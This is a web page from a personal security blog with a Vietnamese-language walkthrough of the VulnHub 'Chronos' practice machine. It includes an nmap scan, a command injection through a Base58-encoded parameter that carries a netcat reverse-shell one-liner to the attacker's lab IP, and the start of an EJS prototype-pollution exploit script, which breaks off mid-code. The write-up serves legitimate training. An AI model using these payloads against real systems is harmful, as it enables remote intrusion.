@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <meta name="google-site-verification" content="Txr_ZAJ6seUhm2Y9s8eRpRy2qOSdUO9A_9jfLLn_bPw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"guyintheclouds.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="OverviewLink download: CHRONOS: 1Difficulty: EZ (Depends on experience)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[VulnHub] Chronos">
+<meta property="og:url" content="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/index.html">
+<meta property="og:site_name" content="Guy_in_the_clouds">
+<meta property="og:description" content="OverviewLink download: CHRONOS: 1Difficulty: EZ (Depends on experience)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://guyintheclouds.com/banner/chronos-vulnhub.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/1.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/2.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/3.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/4.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/5.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/6.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/7.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/8.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/9.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/10.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/11.png">
+<meta property="article:published_time" content="2021-08-10T10:01:28.000Z">
+<meta property="article:modified_time" content="2025-06-14T14:58:22.526Z">
+<meta property="article:author" content="minhnq22">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="write up">
+<meta property="article:tag" content="easy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guyintheclouds.com/banner/chronos-vulnhub.png">
+
+
+<link rel="canonical" href="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://guyintheclouds.com/2021/08/10/chronos-vulnhub/","path":"2021/08/10/chronos-vulnhub/","title":"[VulnHub] Chronos"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[VulnHub] Chronos | Guy_in_the_clouds</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-app-compat.js" integrity="sha256-k2eD8Bl04gp35v4S01cNbO+3UeLK6mVqpOyUJz4aXzY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-firestore-compat.js" integrity="sha256-r1EpenNle+MZs+KB73PFJnrmIF3k29t5XGrSqfZ9PPw=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="firestore" type="application/json">{"enable":true,"collection":"articles","apiKey":"AIzaSyDP3hkyO3EkkJ4jY-xQFQ7J2HKYiNu6ay0","projectId":"guyintheclouds-a8920"}</script>
+  <script src="/js/third-party/statistics/firestore.js" defer></script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Guy_in_the_clouds</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"># cat knowledge >> /dev/brain 2> /proc/mind</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Information-Gathering"><span class="nav-number">2.</span> <span class="nav-text">Information Gathering</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation"><span class="nav-number">3.</span> <span class="nav-text">Exploitation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-shell"><span class="nav-number">4.</span> <span class="nav-text">Get shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privileges-Escalation"><span class="nav-number">5.</span> <span class="nav-text">Privileges Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#www-data-to-imera"><span class="nav-number">5.1.</span> <span class="nav-text">www-data to imera</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#imera-to-root"><span class="nav-number">5.2.</span> <span class="nav-text">imera to root</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="minhnq22"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">minhnq22</p>
+  <div class="site-description" itemprop="description"><i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.linkedin.com/in/minhnq22" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-linkedin fa-fw"></i>Linkedin</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.topcv.vn/xem-cv/BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" title="CV → https:&#x2F;&#x2F;www.topcv.vn&#x2F;xem-cv&#x2F;BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" rel="noopener me" target="_blank"><i class="fa fa-bed fa-fw"></i>CV</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://guyintheclouds.com/2021/08/10/chronos-vulnhub/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="minhnq22">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guy_in_the_clouds">
+      <meta itemprop="description" content="<i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[VulnHub] Chronos | Guy_in_the_clouds">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [VulnHub] Chronos
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-08-10 17:01:28" itemprop="dateCreated datePublished" datetime="2021-08-10T17:01:28+07:00">2021-08-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/VulnHub/" itemprop="url" rel="index"><span itemprop="name">VulnHub</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="firestore-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>6 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="/banner/chronos-vulnhub.png"></p>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/chronos-1,735/">CHRONOS: 1</a><br>Difficulty: EZ (Depends on experience)</p>
+<span id="more"></span>
+<p>IP Victim: 10.10.10.104<br>IP Attacker: 10.10.10.102</p>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><p>Scan qua loa một với Nmap…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.104</span><br><span class="line">Host is up (0.000095s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8000/tcp open  http-alt</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 e4:f2:83:a4:38:89:8d:86:a5:e1:31:76:eb:9d:5f:ea (RSA)</span><br><span class="line">|   256 41:5a:21:c4:58:f2:2b:e4:8a:2f:31:73:ce:fd:37:ad (ECDSA)</span><br><span class="line">|_  256 9b:34:28:c2:b9:33:4b:37:d5:01:30:6f:87:c4:6b:23 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">8000/tcp open  http    Node.js Express framework</span><br><span class="line">|_http-cors: HEAD GET POST PUT DELETE PATCH</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<p>Sơ sơ thì có cổng 22 đang chạy SSH và 2 cổng 80, 8000 đang chạy HTTP Server, trong đó cổng 80 sử dụng Apache và cổng 8000 thì sử dụng NodeJS.<br><img src="/2021/08/10/chronos-vulnhub/1.png"><br>Thề, nhìn quả font chữ với màu hồng neon này làm tôi nhớ đến GTA: Vice City vl.<br>Để ý trong tab Network, thấy có một request tới chronos.local:8000 bị lỗi, giời ạ, bày đặt domain các thứ mới chịu cơ. Mở file hosts lên và thêm vào cuối file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.104 chronos.local</span><br></pre></td></tr></table></figure>
+<p>Ok, save lại và reload lại trang xem nào.<br><img src="/2021/08/10/chronos-vulnhub/2.png"><br>Ngon ngay, giờ thử truy cập thằng vào cái URL khả nghi kia để xem nó làm cái vẹo gì.<br><img src="/2021/08/10/chronos-vulnhub/3.png"><br>Hmm… “Permission Denied” cơ đấy, bắt cái request đó khi truy cập trên cổng 80 xem nó đang xác thực kiểu cc gì.<br><img src="/2021/08/10/chronos-vulnhub/4.png"><br>Haha, “User-Agent: Chronos”, server kiểm tra User-Agent và chỉ cho phép User-Agent có giá trị là “Chronos” mới được phép truy cập.<br>Rồi, thế, giờ làm sao để RCE được cái server này? Ai biết… thử thôi.</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Để ý trên URI có xuất hiện đúng 1 param duy nhất</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>
+<p>Nhìn có vẻ giống giống Base64 đấy, nhưng chả phái đâu, đem decode với Base64 thì không bị báo lỗi, nhưng output thì lằng nhằng không ngửi nổi. Fuzzing linh tinh vào đây thì server trả về lỗi với nội dung:<br><img src="/2021/08/10/chronos-vulnhub/5.png"><br><code>Error: Non-base58 character</code> haha, Base58!<br>Decode ra được nội dung <code>&#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39;</code>, vậy có thể đoán được câu lệnh được chạy trên server sẽ là:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure>
+<p>Hay lắm tml &#x3D;)) giờ thì chỉ cần chèn thêm một đoạn payload để lấy reverse-shell vào cuối, encode Base58 và gửi lại lên server cho nó thực hiện là có thể lấy được shell để RCE server này rồi.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Plantext: &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.10.102 4444 &gt;/tmp/f</span><br><span class="line">Cypher Base58: HAVsuigf4Gz6M7u4o6pcNxNNWj4x1kzw9rg2vjBHYiYj97fKD5XBTAQgFrdaibSuZwGiB4jHmiW8LZDmqYsqXqj7J2tqu4ZB7WDmJ6aF1Qf3TqRoMMqmXHBUxg4zNk7i8z4fDTK72DxQDaVLDbLDfM6NudifYrYZs</span><br></pre></td></tr></table></figure>
+<h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>Thay đoạn cypher kia vào request và bắn, gòi xong…<br><img src="/2021/08/10/chronos-vulnhub/6.png"></p>
+<h2 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h2><h3 id="www-data-to-imera"><a href="#www-data-to-imera" class="headerlink" title="www-data to imera"></a><em>www-data</em> to <em>imera</em></h3><p>Mất một lúc kiểm tra linpeas, các kiểu, tôi nhận ra server đang mở cổng 8080, cơ mà chỉ chấp nhận kết nối từ localhost mà thôi, không thành vấn đề cho lắm khi có thể dùng Meterpreter để Port Forward. Cứ thử xem cái trang đó nó làm gì đã.<br><img src="/2021/08/10/chronos-vulnhub/7.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@chronos:/opt/chronos$ curl localhost:8080</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Chronos - Version 2&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Coming Soon...&lt;/h1&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>Ngắn tũn? Thử tìm mã nguồn của nó xem ở đâu, có đọc được không.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">www-data@chronos:/opt/chronos$ cd ..</span><br><span class="line">www-data@chronos:/opt$ ls</span><br><span class="line">chronos  chronos-v2</span><br><span class="line">www-data@chronos:/opt$ ls -al</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  4 root     root     4096 Jul 30 07:50 .</span><br><span class="line">drwxr-xr-x 23 root     root     4096 Jul 29 08:26 ..</span><br><span class="line">drwxr-xr-x  3 www-data www-data 4096 Aug 20 16:16 chronos</span><br><span class="line">drwxr-xr-x  4 root     root     4096 Aug  3 19:40 chronos-v2</span><br><span class="line">www-data@chronos:/opt$ cd chronos-v2/</span><br><span class="line">www-data@chronos:/opt/chronos-v2$ ls -al</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 4 root root 4096 Aug  3 19:40 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Jul 30 07:50 ..</span><br><span class="line">drwxr-xr-x 3 root root 4096 Aug  3 19:59 backend</span><br><span class="line">drwxr-xr-x 3 root root 4096 Aug  3 19:41 frontend</span><br><span class="line">-rw-r--r-- 1 root root  381 Aug  3 19:39 index.html</span><br><span class="line">www-data@chronos:/opt/chronos-v2$ cd backend/</span><br><span class="line">www-data@chronos:/opt/chronos-v2/backend$ ls -al</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x  3 root root  4096 Aug  3 19:59 .</span><br><span class="line">drwxr-xr-x  4 root root  4096 Aug  3 19:40 ..</span><br><span class="line">drwxr-xr-x 71 root root  4096 Aug  3 19:59 node_modules</span><br><span class="line">-rw-r--r--  1 root root   296 Jul 29 15:34 package.json</span><br><span class="line">-rw-r--r--  1 root root 43066 Aug  3 19:59 package-lock.json</span><br><span class="line">-rw-r--r--  1 root root   505 Aug  3 19:37 server.js</span><br></pre></td></tr></table></figure>
+<p>Nội dung file <em>server.js</em>:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&quot;express-fileupload&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileupload</span>(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&quot;/opt/chronos-v2/frontend/pages&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">   res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title class_">Server</span>(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.<span class="title function_">listen</span>(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>Đối chiếu với kết quả Linpeas, dịch vụ trên cổng 8080 này được chạy với quyền của <em>imera</em>, như vậy, nếu tôi RCE được HTTP server trên cổng 8080, tôi sẽ lấy được quyền điều khiển hệ thống của <em>imera</em>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imera      774  0.0  2.9 599132 38300 ?        Ssl  08:36   0:00 /usr/local/bin/node /opt/chronos-v2/backend/server.js</span><br></pre></td></tr></table></figure>
+<p>Nhận thấy trong mã nguồn có yêu cầu “express-fileupload”, Google “express-fileupload exploit”, tôi nhận được repo trên Github với mã khai thác<br><a target="_blank" rel="noopener" href="https://github.com/boiledsteak/EJS-Exploit">https://github.com/boiledsteak/EJS-Exploit</a><br>Sửa đổi câu lệnh thực thi, tôi sẽ viết một đoạn payload để lấy reverse-shell bằng python vào file <em>&#x2F;tmp&#x2F;reverse.py</em>, và câu lệnh trong EJS-Exploit sẽ là <em>python &#x2F;tmp&#x2F;reverse.py</em>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">##############################################################</span><br><span class="line"># Run this .py to perform EJS-RCE attack</span><br><span class="line"># referenced from</span><br><span class="line"># https://blog.p6.is/Real-World-JS-1/</span><br><span class="line"># </span><br><span class="line"># Timothy, 10 November 2020</span><br><span class="line">##############################################################</span><br><span class="line"></span><br><span class="line">### imports</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">### commands to run on victim machine</span><br><span class="line">cmd = &#x27;python /tmp/reverse.py&#x27;</span><br><span class="line"></span><br><span class="line">print(&quot;Starting Attack...&quot;)</span><br><span class="line">### pollute</span><br><span class="line">requests.post(&#x27;http://localhost:8080&#x27;, files = &#123;&#x27;__proto__.outputFunctionName&#x27;: (</span><br><span class="line">    None, 